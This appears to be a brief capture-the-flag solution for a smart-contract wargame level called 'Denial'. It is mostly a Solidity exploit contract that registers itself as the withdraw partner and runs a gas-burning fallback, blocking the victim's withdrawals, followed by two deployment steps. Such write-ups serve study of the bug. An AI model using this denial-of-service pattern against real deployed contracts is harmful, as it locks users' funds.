Deploy the following contract to the same network
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Denial {
  function setWithdrawPartner(address ) external;
  function withdraw() external;
}

contract Exploit {

    function exploit (address _who) public {
        Denial(_who).setWithdrawPartner(address(this));
    }

    fallback() external payable {
        assembly {
            pop(mload(0xffffffffffffffff))
        }
        //could use assert(false) aswell
    }
}
```
- Call exploit() sending your contract instance
- Submit
